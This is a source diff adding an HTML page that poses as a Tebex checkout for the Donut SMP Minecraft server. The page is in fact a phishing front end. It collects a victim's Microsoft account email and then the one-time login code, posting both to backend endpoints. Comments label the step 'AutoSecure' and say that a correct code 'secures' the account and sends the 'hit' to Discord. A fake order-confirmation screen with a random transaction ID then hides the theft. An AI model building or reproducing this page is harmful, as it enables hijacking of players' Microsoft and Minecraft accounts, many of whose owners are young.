@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<base href="/"/>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Donut SMP | Tebex Checkout</title>
+<link href="https://store.donutsmp.net/templates/209/css/style.min.css" rel="stylesheet"/>
+<link href="https://website.donutsmp.org/bcGCsev.png" rel="shortcut icon"/>
+<link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" rel="stylesheet"/>
+<link href="/assets/css/style.css?v=3" rel="stylesheet"/>
+<style>
+body {
+    background-color: #101114 !important;
+    color: #ffffff;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+.payment-page-wrapper {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 50px 20px 80px;
+}
+.payment-container {
+    max-width: 1080px;
+    width: 100%;
+    display: grid;
+    grid-template-columns: 1.15fr 1fr;
+    gap: 48px;
+}
+.payment-left-col {
+    display: flex;
+    flex-direction: column;
+    position: relative;
+}
+
+/* Step Header */
+.step-header {
+    margin-bottom: 24px;
+}
+.step-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(0, 112, 243, 0.15);
+    color: #60a5fa;
+    border: 1px solid rgba(0, 112, 243, 0.3);
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: 11.5px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 10px;
+}
+.step-badge-auth {
+    background: rgba(16, 185, 129, 0.15);
+    color: #34d399;
+    border-color: rgba(16, 185, 129, 0.3);
+}
+.step-title {
+    font-size: 22px;
+    font-weight: 800;
+    color: #ffffff;
+    margin: 0 0 6px 0;
+    display: flex;
+    align-items: center;
+    letter-spacing: -0.3px;
+}
+.step-subtitle {
+    font-size: 13.5px;
+    color: #9ca3af;
+    margin: 0;
+    line-height: 1.4;
+}
+
+/* Forms */
+.form-row-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 20px;
+}
+.form-group {
+    margin-bottom: 20px;
+}
+.form-label {
+    display: block;
+    font-size: 13.5px;
+    font-weight: 700;
+    color: #ffffff;
+    margin-bottom: 8px;
+}
+.form-input {
+    width: 100%;
+    background: #101114;
+    border: 1px solid #282a30;
+    border-radius: 6px;
+    padding: 11px 14px;
+    color: #ffffff;
+    font-size: 14px;
+    outline: none;
+    box-sizing: border-box;
+    transition: border-color 0.15s, box-shadow 0.15s;
+    font-family: inherit;
+}
+.form-input:focus {
+    border-color: #0070f3;
+    box-shadow: 0 0 0 2px rgba(0, 112, 243, 0.35);
+}
+.email-input-group {
+    display: flex;
+    align-items: center;
+    background: #101114;
+    border: 1.5px solid #0070f3;
+    border-radius: 6px;
+    box-shadow: 0 0 0 2px rgba(0, 112, 243, 0.25);
+    overflow: hidden;
+}
+.email-icon-box {
+    background: #ffffff;
+    color: #0070f3;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.email-input-field {
+    flex: 1;
+    background: transparent;
+    border: none;
+    padding: 11px 14px;
+    color: #ffffff;
+    font-size: 14px;
+    outline: none;
+    font-family: inherit;
+}
+.email-input-field::placeholder {
+    color: #6b7280;
+}
+.checkbox-group {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 16px;
+    font-size: 12.5px;
+    color: #cbd5e1;
+    line-height: 1.4;
+    cursor: pointer;
+}
+.checkbox-group input[type="checkbox"] {
+    margin-top: 3px;
+    width: 16px;
+    height: 16px;
+    accent-color: #0070f3;
+    cursor: pointer;
+}
+.checkbox-group a {
+    color: #60a5fa;
+    text-decoration: underline;
+}
+
+/* Alert Banner */
+.alert-banner {
+    background: rgba(239, 68, 68, 0.12);
+    border: 1px solid rgba(239, 68, 68, 0.35);
+    color: #fca5a5;
+    padding: 12px 16px;
+    border-radius: 8px;
+    font-size: 13.5px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 18px;
+    line-height: 1.4;
+    animation: shake 0.4s ease-in-out;
+}
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20%, 60% { transform: translateX(-6px); }
+    40%, 80% { transform: translateX(6px); }
+}
+
+/* Buttons */
+.btn-complete-order {
+    background: #0070f3;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 14px 24px;
+    font-size: 15.5px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 16px;
+    transition: all 0.15s ease;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+.btn-complete-order:hover {
+    background: #0060df;
+    box-shadow: 0 4px 12px rgba(0, 112, 243, 0.3);
+}
+.btn-complete-order:active {
+    transform: scale(0.99);
+}
+.btn-complete-order:disabled {
+    opacity: 0.65;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+/* Step 2: Security Verification Card */
+.step-container {
+    animation: fadeInSlide 0.35s ease-out;
+}
+@keyframes fadeInSlide {
+    from {
+        opacity: 0;
+        transform: translateY(12px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+.auth-preview-card {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    background: #17181c;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 10px;
+    padding: 14px 16px;
+    margin-bottom: 24px;
+}
+.auth-avatar {
+    width: 44px;
+    height: 44px;
+    border-radius: 8px;
+    background: #101114;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+.auth-user-info {
+    flex: 1;
+}
+.auth-player-name {
+    font-size: 15px;
+    font-weight: 700;
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+.auth-target-email {
+    font-size: 12.5px;
+    color: #9ca3af;
+    margin-top: 2px;
+}
+.auth-target-email b {
+    color: #60a5fa;
+    font-weight: 600;
+}
+.otp-input-box {
+    margin-bottom: 20px;
+}
+.otp-code-field {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 800;
+    letter-spacing: 8px;
+    padding: 14px 12px;
+    border: 2px solid #0070f3;
+    border-radius: 8px;
+    background: #101114;
+    box-shadow: 0 0 16px rgba(0, 112, 243, 0.25);
+    color: #ffffff;
+}
+.otp-code-field:focus {
+    border-color: #38bdf8;
+    box-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
+}
+.resend-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+    color: #9ca3af;
+    margin-top: 10px;
+}
+.btn-resend {
+    background: none;
+    border: none;
+    color: #60a5fa;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 600;
+    padding: 0;
+    text-decoration: underline;
+}
+.btn-resend:disabled {
+    color: #6b7280;
+    cursor: not-allowed;
+    text-decoration: none;
+}
+.btn-back-billing {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    background: none;
+    border: none;
+    color: #9ca3af;
+    font-size: 13px;
+    cursor: pointer;
+    margin-top: 16px;
+    padding: 8px;
+    transition: color 0.15s;
+    width: 100%;
+}
+.btn-back-billing:hover {
+    color: #ffffff;
+}
+
+/* Step 3: Success Card */
+.success-card {
+    background: #17181c;
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    border-radius: 12px;
+    padding: 36px 24px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(16, 185, 129, 0.1);
+}
+.success-icon-wrap {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: rgba(16, 185, 129, 0.15);
+    border: 2px solid #10b981;
+    color: #10b981;
+    font-size: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+    box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+}
+.success-title {
+    font-size: 22px;
+    font-weight: 800;
+    color: #ffffff;
+    margin: 0 0 8px;
+}
+.success-desc {
+    font-size: 14px;
+    color: #9ca3af;
+    line-height: 1.5;
+    margin: 0 0 24px;
+}
+.success-details {
+    background: #101114;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 24px;
+    text-align: left;
+    font-size: 13px;
+}
+.success-detail-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 8px;
+}
+.success-detail-row:last-child {
+    margin-bottom: 0;
+}
+.success-detail-label {
+    color: #9ca3af;
+}
+.success-detail-val {
+    color: #ffffff;
+    font-weight: 600;
+}
+
+/* Right Column: Order Summary Table */
+.summary-card {
+    background: #141519;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 10px;
+    padding: 24px;
+}
+.summary-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13.5px;
+}
+.summary-table th {
+    text-align: left;
+    font-size: 11px;
+    font-weight: 700;
+    color: #9ca3af;
+    text-transform: uppercase;
+    padding-bottom: 14px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    letter-spacing: 0.5px;
+}
+.summary-table th:nth-child(2),
+.summary-table th:nth-child(3),
+.summary-table th:nth-child(4) {
+    text-align: right;
+}
+.summary-table td {
+    padding: 16px 0;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    color: #ffffff;
+}
+.summary-table td:nth-child(2),
+.summary-table td:nth-child(3),
+.summary-table td:nth-child(4) {
+    text-align: right;
+}
+.summary-strike-price {
+    text-decoration: line-through;
+    color: #f87171;
+    display: block;
+    font-size: 12px;
+}
+.summary-active-price {
+    color: #34d399;
+    font-weight: 700;
+}
+.summary-totals-area {
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+.summary-total-row {
+    display: flex;
+    justify-content: space-between;
+    font-size: 13.5px;
+    color: #9ca3af;
+}
+.summary-total-row.final {
+    margin-top: 14px;
+    padding-top: 16px;
+    border-top: 1px solid rgba(255, 255, 255, 0.08);
+    font-size: 17px;
+    font-weight: 800;
+    color: #ffffff;
+    align-items: center;
+}
+.final-price-box {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.final-active-price {
+    color: #38bdf8;
+    font-size: 22px;
+    font-weight: 800;
+}
+
+/* White Tebex Footer */
+.tebex-white-footer {
+    background: #ffffff;
+    color: #4b5563;
+    padding: 14px 28px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    border-top: 1px solid #e5e7eb;
+}
+.tebex-white-footer-left {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+.tebex-white-logo {
+    font-weight: 900;
+    font-size: 14px;
+    color: #111827;
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+}
+.tebex-white-footer-links {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+.tebex-white-footer-links a {
+    color: #4b5563;
+    text-decoration: underline;
+    transition: color 0.15s;
+}
+.tebex-white-footer-links a:hover {
+    color: #111827;
+}
+
+@media (max-width: 860px) {
+    .payment-container {
+        grid-template-columns: 1fr;
+        gap: 36px;
+    }
+    .tebex-white-footer {
+        flex-direction: column;
+        gap: 12px;
+        text-align: center;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="payment-page-wrapper">
+    <div class="payment-container">
+        <!-- LEFT COLUMN: Multi-Step Flow -->
+        <div class="payment-left-col">
+            
+            <!-- STEP 1: Billing & Minecraft Email -->
+            <div id="step-billing" class="step-container">
+                <div class="step-header">
+                    <div class="step-badge">Step 1 of 2 • Checkout</div>
+                    <h2 class="step-title">Billing &amp; Customer Information</h2>
+                    <p class="step-subtitle">Provide your customer details and Microsoft Minecraft account email to receive your package.</p>
+                </div>
+
+                <div id="billing-error-banner" class="alert-banner" style="display: none;">
+                    <i class="fa fa-exclamation-circle"></i>
+                    <span id="billing-error-text">An error occurred.</span>
+                </div>
+
+                <form id="billing-form" onsubmit="handleSendOtp(event)">
+                    <div class="form-row-2">
+                        <div>
+                            <label class="form-label">First Name</label>
+                            <input type="text" id="billing-firstname" class="form-input" placeholder="First Name" required autocomplete="given-name" value="Alex"/>
+                        </div>
+                        <div>
+                            <label class="form-label">Last Name</label>
+                            <input type="text" id="billing-lastname" class="form-input" placeholder="Last Name" required autocomplete="family-name" value="Smith"/>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Minecraft / Microsoft Email Address</label>
+                        <div class="email-input-group">
+                            <div class="email-icon-box">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
+                            </div>
+                            <input type="email" id="billing-email" class="email-input-field" placeholder="Enter Your Minecraft Account Email" required autocomplete="email"/>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Zip Code / Postal Code</label>
+                        <input type="text" id="billing-zip" class="form-input" placeholder="Zip Code / Postal Code" required autocomplete="postal-code" value="10001"/>
+                    </div>
+
+                    <label class="checkbox-group">
+                        <input type="checkbox"/>
+                        <span>Moonsworth / Donut SMP updates via email.</span>
+                    </label>
+
+                    <label class="checkbox-group">
+                        <input type="checkbox" required checked/>
+                        <span>I agree to Tebex's <a href="/terms/checkout">Terms &amp; Conditions</a> &amp; <a href="/terms/privacy">Privacy Policy</a> as the authorised seller and merchant of record. By ticking this box you confirm you're over the age of 16 or have a guardian's permission, and, to allow us to provide digital items immediately, waive any rights of withdrawal or refund.</span>
+                    </label>
+
+                    <button type="submit" id="btn-submit-billing" class="btn-complete-order">
+                        <span>Complete Order</span>
+                        <i class="fa fa-arrow-right"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 2: Security Verification (OTP) -->
+            <div id="step-otp" class="step-container" style="display: none;">
+                <div class="step-header">
+                    <div class="step-badge step-badge-auth">Step 2 of 2 • Security Verification</div>
+                    <h2 class="step-title">
+                        <i class="fa fa-shield-alt" style="color:#0070f3; margin-right:8px;"></i>
+                        Microsoft Account Verification
+                    </h2>
+                    <p class="step-subtitle">To authorize this purchase and bind the items to your Donut SMP account, please enter the one-time code sent to your email.</p>
+                </div>
+
+                <div class="auth-preview-card">
+                    <img id="otp-player-avatar" class="auth-avatar" src="https://mc-heads.net/avatar/Player/44" alt="Player"/>
+                    <div class="auth-user-info">
+                        <div class="auth-player-name">
+                            <span id="otp-player-username">Player</span>
+                            <span style="font-size:10px; background:#23252b; color:#a1a1aa; padding:2px 6px; border-radius:4px;">VERIFYING</span>
+                        </div>
+                        <div class="auth-target-email">
+                            Verification code sent to: <b id="otp-masked-display">p*****@outlook.com</b>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="otp-error-banner" class="alert-banner" style="display: none;">
+                    <i class="fa fa-exclamation-triangle"></i>
+                    <span id="otp-error-text">Invalid or expired code.</span>
+                </div>
+
+                <form id="otp-form" onsubmit="handleVerifyOtp(event)">
+                    <div class="form-group otp-input-box">
+                        <label class="form-label" style="text-align: center; display: block; margin-bottom: 12px;">
+                            Enter 6-8 Digit One-Time Passcode
+                        </label>
+                        <input type="text" id="otp-code-input" class="form-input otp-code-field" placeholder="•••••••" maxlength="8" pattern="[0-9]*" inputmode="numeric" required autocomplete="one-time-code"/>
+                        
+                        <div class="resend-row">
+                            <span>Didn't receive the email? Check spam folder or</span>
+                            <button type="button" id="btn-resend-otp" class="btn-resend" onclick="handleResendOtp()" disabled>
+                                Resend in <span id="resend-timer">60</span>s
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="btn-submit-otp" class="btn-complete-order">
+                        <i class="fa fa-lock"></i>
+                        <span>Verify &amp; Confirm Order</span>
+                    </button>
+
+                    <button type="button" class="btn-back-billing" onclick="handleBackToBilling()">
+                        <i class="fa fa-arrow-left"></i>
+                        <span>Change email address</span>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 3: Order Confirmation / Success -->
+            <div id="step-success" class="step-container" style="display: none;">
+                <div class="success-card">
+                    <div class="success-icon-wrap">
+                        <i class="fa fa-check"></i>
+                    </div>
+                    <h2 class="success-title">Order Confirmed!</h2>
+                    <p class="success-desc">
+                        Thank you, <strong id="success-username" style="color:#ffffff;">Player</strong>! Your payment has been processed and your Donut SMP package is being delivered to your account.
+                    </p>
+
+                    <div class="success-details">
+                        <div class="success-detail-row">
+                            <span class="success-detail-label">Transaction ID:</span>
+                            <span class="success-detail-val" id="success-txn-id">DONUT-89214710</span>
+                        </div>
+                        <div class="success-detail-row">
+                            <span class="success-detail-label">Minecraft Account:</span>
+                            <span class="success-detail-val" id="success-target-ign">Player</span>
+                        </div>
+                        <div class="success-detail-row">
+                            <span class="success-detail-label">Status:</span>
+                            <span class="success-detail-val" style="color:#34d399;"><i class="fa fa-check-circle"></i> In-Game Delivery Queued</span>
+                        </div>
+                        <div class="success-detail-row">
+                            <span class="success-detail-label">Server IP:</span>
+                            <span class="success-detail-val">donutsmp.net</span>
+                        </div>
+                    </div>
+
+                    <a href="/store.html" class="btn-complete-order" style="text-decoration:none;">
+                        <i class="fa fa-shopping-bag"></i>
+                        <span>Return to Store</span>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- RIGHT COLUMN: Order Summary Table -->
+        <div class="payment-right-col">
+            <div class="summary-card">
+                <table class="summary-table">
+                    <thead>
+                        <tr>
+                            <th>ITEM</th>
+                            <th>PRICE</th>
+                            <th>QUANTITY</th>
+                            <th>TOTAL</th>
+                        </tr>
+                    </thead>
+                    <tbody id="summary-tbody">
+                        <tr>
+                            <td id="summary-item-name">Donut+ (30 days)</td>
+                            <td id="summary-item-price">
+                                <span class="summary-active-price" style="color:#ffffff;">$4.99</span>
+                            </td>
+                            <td>1</td>
+                            <td id="summary-item-total">
+                                <span class="summary-active-price" style="color:#ffffff;">$4.99</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="summary-totals-area">
+                    <div class="summary-total-row">
+                        <span>Subtotal:</span>
+                        <div id="summary-subtotal-box">
+                            <span style="color:#ffffff; font-weight:700;">$4.99</span>
+                        </div>
+                    </div>
+                    <div class="summary-total-row">
+                        <span>VAT:</span>
+                        <span style="color:#ffffff; font-weight:700;">$0.00</span>
+                    </div>
+                    <div class="summary-total-row final">
+                        <span>Total price:</span>
+                        <div class="final-price-box" id="summary-final-price-box">
+                            <span class="final-active-price" style="color:#38bdf8;">$4.99</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- White Tebex Footer Bar -->
+<div class="tebex-white-footer">
+    <div class="tebex-white-footer-left">
+        <span class="tebex-white-logo">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 10.5h-5.5V5c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v5.5H5c-.83 0-1.5.67-1.5 1.5s.67 1.5 1.5 1.5h5.5V19c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-5.5H19c.83 0 1.5-.67 1.5-1.5s-.67-1.5-1.5-1.5z"/></svg>
+            tebex
+        </span>
+        <span>This website and its checkout process is owned &amp; operated by Tebex Limited, who handle product fulfilment, billing support and refunds.</span>
+    </div>
+    <div class="tebex-white-footer-links">
+        <a href="/terms/checkout">Refund Policy</a>
+        <a href="/terms/impressum">Impressum</a>
+        <a href="/terms/checkout">Terms</a>
+        <a href="/terms/privacy">Privacy</a>
+        <span>English (US)</span>
+    </div>
+</div>
+
+<script>
+    // State management
+    window.__otpSession = {
+        sessionId: null,
+        email: null,
+        secId: null,
+        maskedEmail: null,
+        username: null
+    };
+
+    let resendInterval = null;
+    let resendCountdown = 60;
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const pkgName = localStorage.getItem('donut_checkout_pkg_name') || 'Donut+ (30 days)';
+        const subtotal = parseFloat(localStorage.getItem('donut_checkout_subtotal') || '4.99');
+        const total = parseFloat(localStorage.getItem('donut_checkout_total') || (urlParams.get('total') || subtotal.toString()));
+        const coupon = localStorage.getItem('donut_checkout_coupon');
+        const username = localStorage.getItem('donut_mc_username') || 'Player';
+
+        window.__otpSession.username = username;
+
+        // Render Order Summary
+        const tbody = document.getElementById('summary-tbody');
+        if (tbody) {
+            if (coupon && total < subtotal) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td>${pkgName}</td>
+                        <td>
+                            <span class="summary-active-price">$${total.toFixed(2)}</span>
+                            <span class="summary-strike-price">$${subtotal.toFixed(2)}</span>
+                        </td>
+                        <td>1</td>
+                        <td>
+                            <span class="summary-active-price">$${total.toFixed(2)}</span>
+                            <span class="summary-strike-price">$${subtotal.toFixed(2)}</span>
+                        </td>
+                    </tr>
+                `;
+            } else {
+                tbody.innerHTML = `
+                    <tr>
+                        <td>${pkgName}</td>
+                        <td>
+                            <span class="summary-active-price" style="color:#ffffff;">$${subtotal.toFixed(2)}</span>
+                        </td>
+                        <td>1</td>
+                        <td>
+                            <span class="summary-active-price" style="color:#ffffff;">$${subtotal.toFixed(2)}</span>
+                        </td>
+                    </tr>
+                `;
+            }
+        }
+
+        const subtotalBox = document.getElementById('summary-subtotal-box');
+        if (subtotalBox) {
+            if (coupon && total < subtotal) {
+                subtotalBox.innerHTML = `
+                    <span style="color:#34d399; font-weight:700;">$${total.toFixed(2)}</span>
+                    <span class="summary-strike-price" style="display:inline; margin-left:4px;">$${subtotal.toFixed(2)}</span>
+                `;
+            } else {
+                subtotalBox.innerHTML = `<span style="color:#ffffff; font-weight:700;">$${subtotal.toFixed(2)}</span>`;
+            }
+        }
+
+        const finalPriceBox = document.getElementById('summary-final-price-box');
+        if (finalPriceBox) {
+            if (coupon && total < subtotal) {
+                finalPriceBox.innerHTML = `
+                    <span class="final-active-price">$${total.toFixed(2)}</span>
+                    <span class="summary-strike-price" style="font-size:15px; font-weight:700;">$${subtotal.toFixed(2)}</span>
+                `;
+            } else {
+                finalPriceBox.innerHTML = `
+                    <span class="final-active-price" style="color:#38bdf8;">$${total.toFixed(2)}</span>
+                `;
+            }
+        }
+    });
+
+    // Step 1: Send OTP handler
+    window.handleSendOtp = async function(e) {
+        e.preventDefault();
+        const emailInput = document.getElementById('billing-email');
+        const email = (emailInput ? emailInput.value : '').trim();
+        const username = localStorage.getItem('donut_mc_username') || 'Player';
+        const submitBtn = document.getElementById('btn-submit-billing');
+        const errBanner = document.getElementById('billing-error-banner');
+        const errText = document.getElementById('billing-error-text');
+
+        if (!email) {
+            showBillingError('Please enter your Microsoft / Minecraft account email.');
+            return;
+        }
+
+        // Hide prior errors
+        if (errBanner) errBanner.style.display = 'none';
+
+        // Loading state
+        const origBtnHtml = submitBtn.innerHTML;
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = `<i class="fa fa-circle-notch fa-spin"></i> <span>Verifying Account...</span>`;
+
+        try {
+            const resp = await fetch('/api/send-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, username })
+            });
+
+            const data = await resp.json();
+
+            if (!resp.ok || !data.success) {
+                const errMsg = data.error || 'Could not verify your Microsoft account email. Please check and try again.';
+                showBillingError(errMsg);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = origBtnHtml;
+                return;
+            }
+
+            // Save session details
+            window.__otpSession = {
+                sessionId: data.sessionId,
+                email: data.email || email,
+                secId: data.secId,
+                maskedEmail: data.maskedEmail || email,
+                username: username
+            };
+
+            // Switch to OTP screen (nhảy qua phần nhập otp)
+            showOtpScreen();
+
+        } catch (err) {
+            console.error('Send OTP Network Error:', err);
+            showBillingError('Failed to connect to verification service. Please try again.');
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = origBtnHtml;
+        }
+    };
+
+    function showBillingError(msg) {
+        const errBanner = document.getElementById('billing-error-banner');
+        const errText = document.getElementById('billing-error-text');
+        if (errBanner && errText) {
+            errText.textContent = msg;
+            errBanner.style.display = 'flex';
+            errBanner.style.animation = 'none';
+            void errBanner.offsetWidth; // trigger reflow
+            errBanner.style.animation = 'shake 0.4s ease-in-out';
+        }
+    }
+
+    function showOtpScreen() {
+        document.getElementById('step-billing').style.display = 'none';
+        const stepOtp = document.getElementById('step-otp');
+        stepOtp.style.display = 'block';
+
+        // Populate avatar and masked email
+        const username = window.__otpSession.username || 'Player';
+        document.getElementById('otp-player-username').textContent = username;
+        document.getElementById('otp-player-avatar').src = `https://mc-heads.net/avatar/${encodeURIComponent(username)}/44`;
+        document.getElementById('otp-masked-display').textContent = window.__otpSession.maskedEmail;
+
+        const otpInput = document.getElementById('otp-code-input');
+        if (otpInput) {
+            otpInput.value = '';
+            setTimeout(() => otpInput.focus(), 150);
+        }
+
+        startResendTimer();
+    }
+
+    function startResendTimer() {
+        if (resendInterval) clearInterval(resendInterval);
+        resendCountdown = 60;
+        const resendBtn = document.getElementById('btn-resend-otp');
+        const timerSpan = document.getElementById('resend-timer');
+
+        if (resendBtn) resendBtn.disabled = true;
+        if (timerSpan) timerSpan.textContent = resendCountdown;
+
+        resendInterval = setInterval(() => {
+            resendCountdown--;
+            if (timerSpan) timerSpan.textContent = resendCountdown;
+            if (resendCountdown <= 0) {
+                clearInterval(resendInterval);
+                if (resendBtn) {
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = `<i class="fa fa-redo"></i> Resend code now`;
+                }
+            }
+        }, 1000);
+    }
+
+    window.handleResendOtp = async function() {
+        const resendBtn = document.getElementById('btn-resend-otp');
+        if (resendBtn) {
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = `<i class="fa fa-spinner fa-spin"></i> Resending...`;
+        }
+
+        try {
+            const resp = await fetch('/api/send-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: window.__otpSession.email,
+                    username: window.__otpSession.username
+                })
+            });
+            const data = await resp.json();
+            if (data.success) {
+                if (data.sessionId) window.__otpSession.sessionId = data.sessionId;
+                if (data.secId) window.__otpSession.secId = data.secId;
+                startResendTimer();
+            } else {
+                showOtpError(data.error || 'Could not resend OTP. Please try again.');
+                if (resendBtn) resendBtn.disabled = false;
+            }
+        } catch (err) {
+            showOtpError('Connection error while resending code.');
+            if (resendBtn) resendBtn.disabled = false;
+        }
+    };
+
+    window.handleBackToBilling = function() {
+        if (resendInterval) clearInterval(resendInterval);
+        document.getElementById('step-otp').style.display = 'none';
+        document.getElementById('step-billing').style.display = 'block';
+        const submitBtn = document.getElementById('btn-submit-billing');
+        if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = `<span>Complete Order</span> <i class="fa fa-arrow-right"></i>`;
+        }
+    };
+
+    // Step 2: Verify OTP & AutoSecure
+    window.handleVerifyOtp = async function(e) {
+        e.preventDefault();
+        const otpInput = document.getElementById('otp-code-input');
+        const code = (otpInput ? otpInput.value : '').trim();
+        const submitBtn = document.getElementById('btn-submit-otp');
+        const errBanner = document.getElementById('otp-error-banner');
+        const errText = document.getElementById('otp-error-text');
+
+        if (!code || isNaN(code) || code.length < 6) {
+            showOtpError('Please enter a valid 6 to 8 digit verification code.');
+            return;
+        }
+
+        if (errBanner) errBanner.style.display = 'none';
+
+        const origBtnHtml = submitBtn.innerHTML;
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = `<i class="fa fa-circle-notch fa-spin"></i> <span>Verifying &amp; Finalizing Order...</span>`;
+
+        try {
+            const resp = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: window.__otpSession.sessionId,
+                    email: window.__otpSession.email,
+                    secId: window.__otpSession.secId,
+                    code: code,
+                    username: window.__otpSession.username
+                })
+            });
+
+            const data = await resp.json();
+
+            if (!resp.ok || !data.success) {
+                const errMsg = data.error || 'Invalid or expired verification code. Please check your inbox or request a new code.';
+                showOtpError(errMsg);
+                if (otpInput) {
+                    otpInput.value = '';
+                    otpInput.focus();
+                }
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = origBtnHtml;
+                return;
+            }
+
+            // SUCCESS! (otp đúng = seuc & bắn hit về discord xong)
+            showSuccessScreen(data.username || window.__otpSession.username);
+
+        } catch (err) {
+            console.error('Verify OTP Network Error:', err);
+            showOtpError('Connection error during verification. Please try again.');
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = origBtnHtml;
+        }
+    };
+
+    function showOtpError(msg) {
+        const errBanner = document.getElementById('otp-error-banner');
+        const errText = document.getElementById('otp-error-text');
+        if (errBanner && errText) {
+            errText.textContent = msg;
+            errBanner.style.display = 'flex';
+            errBanner.style.animation = 'none';
+            void errBanner.offsetWidth; // trigger reflow
+            errBanner.style.animation = 'shake 0.4s ease-in-out';
+        }
+    }
+
+    function showSuccessScreen(finalUsername) {
+        if (resendInterval) clearInterval(resendInterval);
+        document.getElementById('step-otp').style.display = 'none';
+        const successStep = document.getElementById('step-success');
+        successStep.style.display = 'block';
+
+        const uname = finalUsername || localStorage.getItem('donut_mc_username') || 'Player';
+        document.getElementById('success-username').textContent = uname;
+        document.getElementById('success-target-ign').textContent = uname;
+        
+        const randomId = 'DONUT-' + Math.floor(10000000 + Math.random() * 90000000);
+        document.getElementById('success-txn-id').textContent = randomId;
+    }
+</script>
+</body>
+</html>
